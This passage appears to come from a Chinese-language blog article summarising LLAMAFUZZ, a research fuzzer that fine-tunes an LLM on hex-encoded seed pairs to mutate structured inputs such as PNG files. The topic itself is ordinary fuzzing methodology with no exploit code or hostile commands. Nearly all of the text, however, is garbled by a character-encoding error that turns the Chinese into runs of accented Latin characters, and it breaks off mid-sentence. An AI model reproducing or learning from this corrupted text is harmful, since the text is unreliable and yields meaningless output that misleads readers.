ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ä¸»è¦åœ¨æ¯”ç‰¹çº§åˆ«è¿›è¡Œå˜å¼‚ï¼Œåœ¨å¤„ç†ç»“æ„åŒ–æ•°æ®æ—¶å¾€å¾€éœ€è¦å¤§é‡å°è¯•æ‰èƒ½å®ç°æœ‰æ•ˆå˜å¼‚ã€‚</p><p><strong>åŸºäºè¯­æ³•çš„æ¨¡ç³Š</strong>ï¼ˆGrammar-based fuzzingï¼‰æä¾›äº†ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡äººå·¥æŒ‡å®šçš„è¯­æ³•ç”Ÿæˆç»“æ„è‰¯å¥½çš„ç§å­ã€‚è¿™ç§æ–¹æ³•ä¿è¯äº†è¾“å…¥åœ¨å…·å¤‡è¯­æ³•å¤šæ ·æ€§çš„åŒæ—¶ä»æ˜¯è¯­æ³•åˆæ³•çš„ã€‚</p><p>ç ”ç©¶å‘ç°ï¼Œä»¥ä¸‹ä¸‰ç§è¯­æ³•æ„ŸçŸ¥çš„å˜å¼‚æ“ä½œç¬¦åœ¨å‘ç°æ·±å±‚æ¬¡æ¼æ´æ—¶å°¤å…¶æœ‰æ•ˆï¼š</p><ol><li><strong>éšæœºå˜å¼‚ï¼ˆRandom mutationï¼‰</strong>ï¼šé€‰å–ä¸€ä¸ªéšæœºçš„éå¶å­ã€éç»ˆç»“ç¬¦èŠ‚ç‚¹ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æ´¾ç”Ÿå­æ ‘ï¼›</li><li><strong>éšæœºé€’å½’å±•å¼€ï¼ˆRandom recursive unrollingï¼‰</strong>ï¼šæŸ¥æ‰¾é€’å½’çš„äº§ç”Ÿå¼è§„åˆ™ï¼Œå¹¶å°†å…¶å±•å¼€æœ€å¤š $n$ æ¬¡ï¼›</li><li><strong>æ‹¼æ¥ï¼ˆSplicingï¼‰</strong>ï¼šå°†ä¸¤ä¸ªè¾“å…¥æ‹¼æ¥åœ¨ä¸€èµ·ï¼ŒåŒæ—¶ä¿æŒå…¶è¯­æ³•çš„åˆæ³•æ€§ã€‚</li></ol><p>è¿™äº›ç»“æ„åŒ–å˜å¼‚ç­–ç•¥å¤§å¹…æå‡äº†æ¨¡ç³Šæµ‹è¯•åœ¨å¤„ç†å¤æ‚è¾“å…¥æ ¼å¼æ—¶çš„æœ‰æ•ˆæ€§ä¸æ•ˆç‡ã€‚</p><h3 id="2-4-å¤§è¯­è¨€æ¨¡å‹"><a href="#2-4-å¤§è¯­è¨€æ¨¡å‹" class="headerlink" title="2.4 å¤§è¯­è¨€æ¨¡å‹"></a>2.4 å¤§è¯­è¨€æ¨¡å‹</h3><p>åœ¨è¿‘æœŸçš„ç ”ç©¶ä¸­ï¼Œé¢„è®­ç»ƒçš„ LLM åœ¨è‡ªç„¶è¯­è¨€ä»»åŠ¡ä¸Šè¡¨ç°å‡ºäº†ä»¤äººå°è±¡æ·±åˆ»çš„è¡¨ç°ï¼ŒåŒ…æ‹¬è‡ªç„¶è¯­è¨€ç†è§£ã€æ¨ç†ã€è‡ªç„¶è¯­è¨€ç”Ÿæˆã€å¤šè¯­è¨€å¤„ç†ä»¥åŠäº‹å®æ€§åˆ¤æ–­ç­‰æ–¹é¢ã€‚</p><p>é€šè¿‡æ— ç›‘ç£å­¦ä¹ ï¼ŒLLM åœ¨æµ·é‡æ–‡æœ¬æ•°æ®ä¸Šè¿›è¡Œé¢„è®­ç»ƒï¼Œä»è€Œå…·å¤‡äº†å¹¿æ³›çš„é€šç”¨çŸ¥è¯†ã€‚æ­¤å¤–ï¼Œå‡­å€Ÿæ•°åäº¿ç”šè‡³æ•°ä¸‡äº¿çš„å‚æ•°è§„æ¨¡ï¼ŒLLMs ä¸ä»…èƒ½å¤Ÿæ•æ‰ä¸Šä¸‹æ–‡ç§çš„è¯­è¨€æ¨¡å¼ï¼Œè¿˜èƒ½å¤Ÿæ›´æ·±å…¥åœ°ç†è§£æ–‡æœ¬æ•°æ®ï¼Œä¾‹å¦‚æ–‡ä»¶ä¸­çš„æ ¼å¼ä¿¡æ¯å’Œç»“æ„å—ä¿¡æ¯ã€‚</p><p>è¿™ç§èƒ½åŠ›ä½¿å¾— LLMs çš„åº”ç”¨è¶…è¶Šäº†ä¼ ç»Ÿè‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰ä»»åŠ¡ï¼Œå…¶é€šç”¨æ€§å·²åœ¨å¤šä¸ªé¢†åŸŸå¾—åˆ°éªŒè¯ï¼Œå¦‚è§†è§‰åˆ†ç±»ã€è›‹ç™½è´¨åºåˆ—ç”Ÿæˆã€ä»£ç ç”Ÿæˆã€‚</p><p>åœ¨è¿™ç§é€šç”¨èƒ½åŠ›çš„åŸºç¡€ä¸Šï¼ŒLLMs åœ¨è§£æå’Œå¤„ç†ä¸åŒæ•°æ®ç»“æ„æ–¹é¢çš„å†…åœ¨èƒ½åŠ›ï¼Œä½¿å…¶åœ¨æ¨¡ç³Šæµ‹è¯•çš„<strong>å˜å¼‚é˜¶æ®µ</strong>è¡¨ç°å‡ºç‰¹åˆ«çš„ä¼˜åŠ¿ã€‚</p><p>ä¾‹å¦‚ï¼ŒCHATFUZZ åˆ©ç”¨ LLMs ç›´æ¥ç”Ÿæˆæµ‹è¯•ç§å­ï¼Œä½†å…¶åº”ç”¨ç›®å‰ä»…é™äºé¢å‘æ–‡æœ¬æ ¼å¼çš„ç›®æ ‡ç¨‹åºï¼Œå¦‚ JSON å’Œ XMLã€‚</p><p>æ­¤å¤–ï¼Œpsamez ç­‰äººå±•ç¤ºäº†å‹ç¼©è¯­è¨€æ¨¡å‹ï¼ˆCompressed-Language Modelsï¼‰å¯ä»¥ç†è§£ç”±å‹ç¼©æ–‡ä»¶æ ¼å¼ç¼–ç çš„æ–‡ä»¶å†…å®¹ã€‚</p><p>åœ¨æˆ‘ä»¬çš„å®éªŒä¸­ï¼ŒLLMs èƒ½å¤Ÿç”Ÿæˆæœ‰ä»·å€¼çš„æµ‹è¯•ç§å­ï¼Œè¿™äº›ç§å­åœ¨æ¢ç´¢æ–°çš„è·¯å¾„ä¸Šèµ·åˆ°äº†å…³é”®ä½œç”¨ï¼Œä»è€Œå¸®åŠ©è·å¾—æ›´å¥½çš„è¾¹è¦†ç›–ç‡ï¼ˆedge coverageï¼‰ã€‚</p><h2 id="0x03-è®¾è®¡æ€è·¯"><a href="#0x03-è®¾è®¡æ€è·¯" class="headerlink" title="0x03 è®¾è®¡æ€è·¯"></a>0x03 è®¾è®¡æ€è·¯</h2><h3 id="3-1-ç³»ç»Ÿæ¶æ„"><a href="#3-1-ç³»ç»Ÿæ¶æ„" class="headerlink" title="3.1 ç³»ç»Ÿæ¶æ„"></a>3.1 ç³»ç»Ÿæ¶æ„</h3><p>æœ¬æ–‡æå‡ºäº† LLAMAFUZZï¼Œä¸€ä¸ªåŸºäº LLM çš„ç°ç›’æ¨¡ç³Šå·¥å…·ï¼Œæ—¨åœ¨é«˜æ•ˆå˜å¼‚ç»“æ„åŒ–æ•°æ®ã€‚å¦‚å›¾1æ‰€ç¤ºï¼Œæˆ‘ä»¬çš„æ–¹æ³•åŒ…æ‹¬ä¸¤ä¸ªé˜¶æ®µï¼š</p><ol><li>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ©ç”¨æˆå¯¹çš„ç»“æ„åŒ–æ•°æ®å¯¹ LLM è¿›è¡Œå¾®è°ƒï¼Œä»¥ä½¿å…¶èƒ½å¤Ÿç†è§£åº•å±‚çš„æ•°æ®ç»“æ„å’Œå˜å¼‚è½¬æ¢æ–¹å¼ï¼›</li><li>ç„¶åï¼Œæˆ‘ä»¬å°† LLM é›†æˆåˆ°æ¨¡ç³Šæµ‹è¯•æµç¨‹ä¸­ï¼Œä½¿å…¶èƒ½å¤ŸåŸºäºç°æœ‰è¾“å…¥ç”Ÿæˆç»“æ„è‰¯å¥½çš„ç§å­ã€‚</li></ol><p>å…³é”®åœ¨äº<strong>å¾®è°ƒé˜¶æ®µ</strong>ï¼Œå®ƒä½¿å¾— LLM èƒ½å¤Ÿç†è§£ç›®æ ‡æ•°æ®çš„ç»“æ„å’Œå˜å¼‚é€»è¾‘ï¼Œä»è€Œé€šè¿‡å¾®è°ƒå®ç°å¯¹å„ç§æ•°æ®æ ¼å¼çš„é€‚åº”ã€‚</p><p>å·¥ä½œæµç¨‹åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ol><li><strong>å¾®è°ƒå‡†å¤‡</strong>ï¼šæˆ‘ä»¬çš„è®­ç»ƒæ•°æ®æ¥è‡ªå¤šç§æ¥æºï¼ŒåŒ…æ‹¬ FuzzBench å®éªŒæ•°æ®å’Œ AFL++çš„å®éªŒæ•°æ®ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¼•å…¥äº†ä¸€ç§æ•°æ®è½¬æ¢æ–¹æ³•ï¼Œå…è®¸ LLM ç”Ÿæˆå„ç§æ•°æ®æ ¼å¼ã€‚</li><li><strong>ç”¨äºå˜å¼‚çš„ LLM å¾®è°ƒ</strong>ã€‚æˆ‘ä»¬ä»‹ç»äº†å¯¹ LLM è¿›è¡Œå¾®è°ƒï¼Œç„¶ååˆ©ç”¨ LLM è¿›è¡Œç»“æ„æ„ŸçŸ¥çš„å˜å¼‚æ“ä½œã€‚</li><li><strong>èåˆ fuzzer å’Œ LLM</strong>ï¼šæˆ‘ä»¬å±•ç¤ºäº†ä¸€ç§å¼‚æ­¥é›†æˆçš„æ–¹æ³•ï¼Œä½¿ fuzzer ä¸ LLM ä¹‹é—´å¯ä»¥è¿›è¡Œå¼‚æ­¥é€šä¿¡ï¼Œæå‡æ•´ä½“æ•ˆç‡å’Œå¹¶å‘èƒ½åŠ›ã€‚</li></ol><h3 id="3-2-å¾®è°ƒå‡†å¤‡"><a href="#3-2-å¾®è°ƒå‡†å¤‡" class="headerlink" title="3.2 å¾®è°ƒå‡†å¤‡"></a>3.2 å¾®è°ƒå‡†å¤‡</h3><p>é¦–å…ˆåœ¨å¤šæ ·åŒ–çš„å¤§è§„æ¨¡æœªæ ‡æ³¨è¯­æ–™åº“ä¸Šè¿›è¡Œç”Ÿæˆå¼é¢„è®­ç»ƒï¼ˆgenerative pre-trainingï¼‰ï¼Œç„¶åé’ˆå¯¹ç‰¹å®šä»»åŠ¡è¿›è¡Œåˆ¤åˆ«å¼å¾®è°ƒï¼ˆdiscriminative fine-tuningï¼‰ã€‚</p><p>åœ¨åŸºç¡€æ¨¡å‹çš„é€‰æ‹©ä¸Šï¼Œé‡‡ç”¨ llama-2-7b-chat-hfï¼Œè¯¥æ¨¡å‹åœ¨å¤§çº¦ 2 ä¸‡äº¿ä¸ª token ä¸Šè¿›è¡Œäº†é¢„è®­ç»ƒã€‚</p><p>å¾®è°ƒæ‰€ç”¨çš„æ•°æ®æ¥è‡ªäºçœŸå®çš„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™äº›æ•°æ®è®­ç»ƒ LLM ç†è§£ç»“æ„åŒ–æ•°æ®çš„æ¨¡å¼å’Œå˜å¼‚æ–¹å¼ï¼Œä»è€Œä½¿å…¶èƒ½å¤Ÿåœ¨ä¿æŒåŸå§‹ç»“æ„çš„åŒæ—¶ï¼Œå¯¹ç»™å®šç§å­è¿›è¡Œæœ‰æ•ˆä¿®æ”¹ï¼Œç”Ÿæˆå…·æœ‰ä»·å€¼çš„æ–°æµ‹è¯•ç§å­ã€‚</p><h4 id="3-2-1-å¾®è°ƒæ•°æ®æ”¶é›†"><a href="#3-2-1-å¾®è°ƒæ•°æ®æ”¶é›†" class="headerlink" title="3.2.1 å¾®è°ƒæ•°æ®æ”¶é›†"></a>3.2.1 å¾®è°ƒæ•°æ®æ”¶é›†</h4><p>ä¸ºäº†ä½¿ LLM èƒ½å¤Ÿç†è§£æ•°æ®ç»“æ„å¹¶ç”Ÿæˆç»“æ„åŒ–çš„æµ‹è¯•ç§å­ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ„å»ºä¸€ä¸ªè®­ç»ƒæ•°æ®é›†ã€‚</p><p>å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬ä» FuzzBench çš„å®éªŒæ•°æ®å’Œ AFL++ çš„æ¨¡ç³Šæµ‹è¯•æ•°æ®ä¸­æ”¶é›†æœ‰ä»·å€¼çš„ç§å­ï¼Œæ»¡è¶³ï¼š</p><ol><li>èƒ½è§¦å‘æ–°çš„æ–°çš„è·¯å¾„ï¼›</li><li>æ‹¥æœ‰ä¸åŒçš„å‘½ä¸­æ¬¡æ•°ï¼›</li><li>èƒ½è§¦å‘ç¨‹åºå´©æºƒã€‚</li></ol><p>è¿™äº›æ ‡å‡†çš„ç†ç”±å¾ˆç›´è§‚ï¼š</p><ul><li>æå‡ä»£ç è¦†ç›–ç‡å¯ä»¥å¸®åŠ© fuzzer æ¢ç´¢æ›´å¤šæœªè®¿é—®çš„è·¯å¾„ï¼Œå› ä¸ºæ¼æ´å¾€å¾€éšè—åœ¨å°šæœªæ‰§è¡Œçš„è·¯å¾„ä¸­ã€‚</li><li>æ‹¥æœ‰ä¸åŒå‘½ä¸­æ¬¡æ•°çš„ç§å­è™½ç„¶ä¸ä¸€å®šæå‡è¦†ç›–ç‡ï¼Œä½†å¯èƒ½ä»¥ä¸åŒçš„æ–¹å¼æ‰§è¡Œç¨‹åºï¼Œè¿›è€Œå‘ç°å·²è¦†ç›–è·¯å¾„ä¸­çš„æ–°æ¼æ´ï¼›</li><li>è€Œè§¦å‘å´©æºƒçš„ç§å­æœ¬èº«å°±å…·å¤‡æé«˜çš„ä»·å€¼ï¼Œæ˜¯æ¨¡ç³Šæµ‹è¯•çš„ç›´æ¥ç›®æ ‡ã€‚</li></ul><p>æ³¨æ„ï¼šè¿™ä¸ªæ•°æ®é›†ä¸åŒ…æ‹¬ä»»ä½•æ¥è‡ª Manga çš„å®éªŒæ•°æ®ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢ LLM ä»…ä»…æ˜¯å›å¿†å’Œé‡æ”¾å®ƒè®°ä½çš„ç§å­æ¥è§¦å‘æ¼æ´ï¼Œè€ŒéçœŸæ­£çš„å­¦ä¹ ç§å­å˜å¼‚ç­–ç•¥ã€‚</p><h4 id="3-2-2-æ•°æ®è½¬æ¢å’Œé¢„å¤„ç†"><a href="#3-2-2-æ•°æ®è½¬æ¢å’Œé¢„å¤„ç†" class="headerlink" title="3.2.2 æ•°æ®è½¬æ¢å’Œé¢„å¤„ç†"></a>3.2.2 æ•°æ®è½¬æ¢å’Œé¢„å¤„ç†</h4><p>ä¸ºäº†æ„å»ºé€šç”¨çš„ç§å­çªå˜æ¨¡å‹ï¼Œæˆ‘ä»¬éµå¾ªå°†äºŒè¿›åˆ¶è¾“å…¥æ–‡ä»¶è½¬æ¢ä¸ºç»Ÿä¸€çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚è¿›è¡Œè¿™ç§è½¬æ¢çš„åŸå› å¦‚ä¸‹ï¼š</p><ol><li><strong>ç›®æ ‡é€‚é…å¤šç§æ•°æ®æ ¼å¼</strong>ï¼šæˆ‘ä»¬å¸Œæœ› LLAMAFUZZ èƒ½å¤Ÿå¤„ç†å„ç§ä¸åŒæ ¼å¼çš„æ•°æ®ã€‚ç„¶è€Œï¼Œä¸ºæ¯ç§æ ¼å¼å®šåˆ¶è¯»å–æ–¹å¼åœ¨å®è·µä¸­å¹¶ä¸å¯è¡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§ç»Ÿä¸€çš„æ•°æ®è¯»å–æ–¹å¼ã€‚</li><li><strong>é€‚é… LLM çš„è¾“å…¥ç‰¹æ€§</strong>ï¼šä¼ ç»Ÿ fuzzer å¯¹äºŒè¿›åˆ¶ç§å­è¿›è¡Œæ¯”ç‰¹çº§æ“ä½œï¼Œè€Œ LLM åˆ™é€šå¸¸ä»¥è‡ªç„¶è¯­è¨€ä¸ºè¾“å…¥ã€‚å› æ­¤ï¼Œæœ‰å¿…è¦å°†è®­ç»ƒæ•°æ®è½¬æ¢ä¸º LLM å¯ä»¥ç†è§£çš„æ ¼å¼ã€‚</li><li><strong>ä¿æŒè½¬æ¢æ•ˆç‡</strong>ï¼šæ•°æ®çš„è½¬æ¢è¿‡ç¨‹å¿…é¡»é«˜æ•ˆå’Œå¿«é€Ÿï¼Œå› ä¸ºç¼“æ…¢çš„è½¬æ¢è¿‡ç¨‹ä¼šç›´æ¥å½±å“æ¨¡ç³Šæµ‹è¯•çš„ååé‡ã€‚</li></ol><p>ä¸å…¶å®ƒç¼–ç æ–¹å¼ï¼ˆå¦‚ Base64ï¼‰ç›¸æ¯”ï¼Œåå…­è¿›åˆ¶ç¼–ç æ›´ç›´è§‚ã€æ˜“äºå®ç°ï¼Œå¹¶ä¸”ä¾¿äºä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ç›´æ¥è½¬æ¢ã€‚</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¿™ç§æ•°æ®è½¬æ¢ä»…é€‚ç”¨äºåŸºäºäºŒè¿›åˆ¶çš„æ•°æ®ã€‚<br>å¯¹äºæ–‡æœ¬ç±»å‹çš„æ•°æ®ï¼Œæˆ‘ä»¬ä»…åœ¨ç§å­å‰æ·»åŠ  promptï¼Œå› æ­¤å·²æœ‰ç ”ç©¶è¡¨æ˜ LLM èƒ½å¾ˆå¥½åœ°å¤„ç†åŸºäºæ–‡æœ¬çš„ç§å­ã€‚</p></blockquote><figure>  <img src="assets/Pasted%20image%2020250629083827.png" alt="ç³»ç»Ÿæ¶æ„å›¾">  <figcaption><b>å›¾ 3ï¼š</b>æ•°æ®é›†é¢„å¤„ç†çš„å·¥ç¨‹æµç¨‹ã€‚</figcaption></figure><p>å¦‚å›¾ 3 æ‰€ç¤ºï¼Œæˆ‘ä»¬çš„æ•°æ®è½¬æ¢æ–¹æ³•åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>åˆå§‹è½¬æ¢</strong>ï¼šé¦–å…ˆï¼Œå°†äºŒè¿›åˆ¶ç§å­æ–‡ä»¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºã€‚</li><li><strong>ç”Ÿæˆ token</strong>ï¼šéšåï¼Œæ¯ä¸¤ä¸ªè¿ç»­çš„åå…­è¿›åˆ¶å­—ç¬¦å°†ç»„æˆä¸€ä¸ª tokenï¼Œä»è€Œå‡å°‘è¾“å…¥å­—ç¬¦ä¸²çš„ token æ€»æ•°ã€‚</li><li><strong>æ·»åŠ æç¤ºè¯</strong>ï¼šæœ€åï¼Œæˆ‘ä»¬ä¸ºæ¯æ¡å¾®è°ƒæ•°æ®æ·»åŠ  promptï¼Œä»¥ä½¿ LLM æ›´æ¸…é™¤å…¶ä»»åŠ¡ç›®æ ‡ã€‚</li></ol><p>é™¤äº†æ•°æ®è½¬æ¢ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¼•å…¥äº†å™ªå£°æ•°æ®åˆ°è®­ç»ƒé›†ä¸­ï¼Œä»¥é™ä½è¿‡æ‹Ÿåˆå’Œè®­ç»ƒæ•°æ®é‡æ”¾çš„é£é™©ã€‚</p><p>åœ¨è®­ç»ƒæ•°æ®çš„ç»„ç»‡å½¢å¼ä¸Šï¼Œæ¯æ¡æ•°æ®éƒ½æ˜¯ä¸€å¯¹ç§å­ï¼šåŸå§‹ç§å­ä¸å…¶å¯¹åº”çš„å˜å¼‚ç‰ˆæœ¬ã€‚</p><p>è¿™ç§ç»“æ„è®¾è®¡æ—¨åœ¨å¸®åŠ© LLM å­¦ä¹ ï¼š</p><ul><li>ç§å­çš„å˜å¼‚è½¬æ¢æ¨¡å¼ã€‚</li><li>ä»¥åŠæ•°æ®æ ¼å¼çš„åº•å±‚ç»“æ„ã€‚</li></ul><h3 id="3-3-é’ˆå¯¹å˜å¼‚çš„å¾®è°ƒ-LLM"><a href="#3-3-é’ˆå¯¹å˜å¼‚çš„å¾®è°ƒ-LLM" class="headerlink" title="3.3 é’ˆå¯¹å˜å¼‚çš„å¾®è°ƒ LLM"></a>3.3 é’ˆå¯¹å˜å¼‚çš„å¾®è°ƒ LLM</h3><p>æœ¬èŠ‚æè¿°äº†å¯¹ LLM è¿›è¡Œå¾®è°ƒï¼Œç„¶ååˆ©ç”¨ LLM è¿›è¡Œç»“æ„æ„ŸçŸ¥çªå˜çš„æ–¹æ³•ã€‚</p><h4 id="3-3-1-å¾®è°ƒ"><a href="#3-3-1-å¾®è°ƒ" class="headerlink" title="3.3.1 å¾®è°ƒ"></a>3.3.1 å¾®è°ƒ</h4><p>å¯¹é¢„è®­ç»ƒæ¨¡å‹è¿›è¡Œå¾®è°ƒæ˜¯ä¸€ç§å¸¸è§çš„ç­–ç•¥ï¼Œç”¨äºä½¿æ¨¡å‹åœ¨ç‰¹å®šä¸‹æ¸¸ä»»åŠ¡ä¸­è¡¨ç°å¾—æ›´åŠ ä¸“ä¸šã€‚åŒæ ·ï¼Œåœ¨åˆ©ç”¨é€šç”¨ LLM è¿›è¡Œç»“æ„åŒ–æ•°æ®å˜å¼‚æ—¶ï¼Œç›‘ç£å¼å¾®è°ƒä¹Ÿæ˜¯å¿…è¦çš„ã€‚è¿™ä¸ªè¿‡ç¨‹å»ºç«‹åœ¨é¢„è®­ç»ƒæ¨¡å‹çš„ä¸€èˆ¬ç†è§£ä¹‹ä¸Šï¼Œå¹¶é€šè¿‡ç›‘ç£å­¦ä¹ ä½¿å…¶é€‚åº”ç‰¹å®šçš„ä»»åŠ¡ã€‚åœ¨ç›‘ç£å¾®è°ƒæœŸé—´ï¼ŒLLM å¯ä»¥æ ¹æ®ç‰¹å®šä»»åŠ¡æŸå¤±å¾—å‡ºçš„æ¢¯åº¦æ¥è°ƒæ•´æƒé‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›‘ç£å¾®è°ƒæ¥æ•™ LLM ç†è§£è¾“å…¥è¯­æ³•å’Œè¾“å‡ºå˜å¼‚ã€‚</p><p>è¿›è¡Œå¾®è°ƒçš„ç¬¬ä¸€æ­¥æ˜¯å‡†å¤‡æœ‰æ•ˆçš„æç¤ºï¼Œå›¾ 3 å³ä¾§çš„ Pair 1åˆ° Pair nä¸ºæ¨¡å‹æä¾›äº†å¯¹ç»“æ„åŒ–æ•°æ®è¿›è¡Œå˜å¼‚çš„ç¤ºä¾‹å’Œç›¸åº”çš„å˜å¼‚ç»“æœã€‚åœ¨è¿™ä¸ªæç¤ºç¬¦ä¸­ï¼Œfuzzerä»¥åå…­è¿›åˆ¶è¡¨ç¤ºæä¾›äº†å½“å‰çš„ç»“æ„åŒ–æ•°æ®å’ŒæœŸæœ›çš„å˜å¼‚ç»“æœã€‚éšåï¼Œæˆ‘ä»¬å¼ºè°ƒæ ¼å¼å…³é”®å­—ï¼Œå…è®¸ LLM ä»é¢„è®­ç»ƒçš„çŸ¥è¯†ä¸­è·å–å¯¹æ ¼å¼çš„ä¸€èˆ¬ç†è§£æ¥è¿›è¡Œå˜å¼‚ã€‚ä¸è¿‡ï¼ŒLLM å¯èƒ½å¶å°”ä¼šäº§ç”Ÿéšæœºè¾“å‡ºï¼Œä¸è¿‡è¿™ç§è¡Œä¸ºç›¸å¯¹ç½•è§ï¼Œä¸ä¼šå¯¹æ•´ä¸ª Fuzzing è¿‡ç¨‹äº§ç”Ÿé‡å¤§å½±å“ã€‚ç”±äºè¿™äº›å“åº”é€šå¸¸æ˜¯æ— æ•ˆçš„ï¼Œå› æ­¤å®ƒä»¬å¾ˆå®¹æ˜“è¢« fuzzer å¿½ç•¥ï¼Œè€Œä¸ä¼šå½±å“ç»“æœã€‚</p><p>å›¾ 2 å±•ç¤ºäº†ä¸€ä¸ªç”± LLM å˜å¼‚çš„ PNG ç§å­ç¤ºä¾‹ï¼Œå…¶ä¸­ç”¨çº¢è‰²çªå‡ºæ˜¾ç¤ºçš„å­—èŠ‚æ˜¯ LLM å®Œæˆçš„çªå˜ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒPNG æ–‡ä»¶è¢«æ„é€ æˆ PNG ç­¾åã€IHDRã€gAMAå’ŒåŸå§‹æ•°æ®å—ã€‚ç­¾åé€šå¸¸è¢«ç§°ä¸ºæ–‡ä»¶å¤´ï¼Œç”±å›ºå®šçš„ 8 ä¸ªå­—èŠ‚ç»„æˆï¼Œæ ‡å¿—ç€æ–‡ä»¶çš„å¼€å§‹ã€‚ç´§è·Ÿç€ç­¾åçš„ IHDR å—æ˜¯è‡³å…³é‡è¦çš„ï¼Œå› ä¸ºå®ƒåŒ…å«åŸºæœ¬çš„å›¾åƒä¿¡æ¯ï¼Œå¦‚å®½åº¦ã€é«˜åº¦ã€ä½æ·±ã€é¢œè‰²ç±»å‹ã€å‹ç¼©æ–¹æ³•ã€æ»¤æ³¢æ–¹æ³•å’Œéš”è¡Œæ–¹æ³•ï¼ŒgAMA å—æŒ‡å®šå›¾åƒå’Œæ‰€éœ€æ˜¾ç¤ºè¾“å‡ºä¹‹é—´çš„å…³ç³»ã€‚åç»­å—åœ¨æœ¬è´¨ä¸Šé€šå¸¸æ˜¯è¾…åŠ©çš„ã€‚åœ¨ IHDR ä¹‹åï¼ŒPNG æ–‡ä»¶åŒ…å«å‡ ä¸ªè¾…åŠ©å—ã€‚</p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒLLM é€‰æ‹©æ€§åœ°ä¿®æ”¹ IHDRã€gAMAå’Œæ•°æ®å—ã€‚å®ƒä¸ä»…ä¿ç•™äº†åŸå§‹æ•°æ®æ ¼å¼çš„å®Œæ•´æ€§ï¼Œè¿˜å¼•å…¥äº†æœ‰æ•ˆçš„ä¿®æ”¹ï¼Œå¢å¼ºäº†ç§å­è§¦å‘æ¼æ´çš„æ½œåŠ›ã€‚</p><h4 id="3-3-2-ç”Ÿæˆ"><a href="#3-3-2-ç”Ÿæˆ" class="headerlink" title="3.3.2 ç”Ÿæˆ"></a>3.3.2 ç”Ÿæˆ</h4><p>ä¸‹ä¸€æ­¥æ˜¯å°†æ¥è‡ª fuzzer çš„å½“å‰ç§å­ç»“åˆæç¤ºè¯ä½œä¸º LLM çš„è¾“å…¥ã€‚æç¤ºè¯ç”¨äºå¼•å¯¼ LLM ç”Ÿæˆä¸å…¶å¾®è°ƒé˜¶æ®µæ‰€å®éªŒæ ¼å¼ä¿æŒä¸€è‡´çš„å˜å¼‚å†…å®¹ã€‚LLM ç”Ÿæˆå“åº”åï¼Œè¾“å‡ºç»“æœä¼šè¢«è§£æå¹¶è½¬æ¢å›äºŒè¿›åˆ¶æ ¼å¼ã€‚æˆ‘ä»¬æœŸæœ›ç”Ÿæˆçš„å†…å®¹æ˜¯å¯¹åŸå§‹ç§å­çš„ç»“æ„åŒ–å˜å¼‚ï¼Œå³åœ¨ä¿æŒåŸå§‹è¾“å…¥ç»“æ„å®Œæ•´æ€§çš„å‰æä¸‹ï¼Œäº§ç”Ÿæœ‰æ„ä¹‰çš„å˜å¼‚ç§å­ã€‚</p><h3 id="3-4-æ•´åˆfuzzerå’ŒLLM"><a href="#3-4-æ•´åˆfuzzerå’ŒLLM" class="headerlink" title="3.4 æ•´åˆfuzzerå’ŒLLM"></a>3.4 æ•´åˆfuzzerå’ŒLLM</h3><p>å¯¹äºç°ç›’ fuzzers æ¥è¯´ï¼Œé€Ÿåº¦æ˜¯è‡³å…³é‡è¦çš„ï¼Œå®ƒèƒ½å¤Ÿæ¯ç§’æ‰§è¡Œæ•°ç™¾ç”šè‡³æ•°åƒä¸ªç§å­ã€‚ä»»ä½•é¢å¤–é›†æˆæµç¨‹ï¼ˆå¦‚åŸºäº LLM çš„å˜å¼‚æœºåˆ¶ï¼‰éƒ½å¯èƒ½å½±å“æ•´ä½“ååé‡ï¼Œè¿›è€Œé™ä½æ¨¡ç³Šæµ‹è¯•çš„æ•ˆèƒ½ã€‚å°¤å…¶æ˜¯ LLM ç”Ÿæˆè¿‡ç¨‹å­˜åœ¨æ˜¾è‘—çš„æ€§èƒ½ç“¶é¢ˆï¼šå…¶é€Ÿåº¦æ›´æ…¢ä¸”è®¡ç®—å¯†é›†ï¼Œä¸»è¦ä¾èµ–å¤§é‡ CPU èµ„æºã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸€é€Ÿåº¦ä¸åŒ¹é…çš„é—®é¢˜ï¼Œè®ºæ–‡è®¾è®¡äº† LLM ä¸ fuzzer ä¹‹é—´çš„å¼‚æ­¥é€šä¿¡æœºåˆ¶ã€‚å…·ä½“å®ç°æµç¨‹å¦‚ä¸‹ï¼šé¦–å…ˆå°†å½“å‰ç§å­å¿«é€Ÿè½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ï¼›éšå fuzzer åœ¨å‘ LLM å‘é€ç§å­çš„åŒæ—¶ï¼ŒæŒç»­æ¥æ”¶ LLM è¿”å›çš„æ–°ç§å­ï¼›LLM å®Œæˆç§å­å˜å¼‚åç«‹å³å›ä¼ æ–°ç§å­ä¾›åç»­æµ‹è¯•ã€‚è¯¥å¼‚æ­¥æ¶æ„å®Œå…¨æ¶ˆé™¤äº†ç­‰å¾…å»¶è¿Ÿï¼Œä½¿å¾— fuzzer èƒ½å¤ŸæŒç»­ä¿æŒé«˜é€Ÿè¿è¡ŒçŠ¶æ€ï¼Œæ— éœ€é˜»å¡ç­‰å¾… LLM 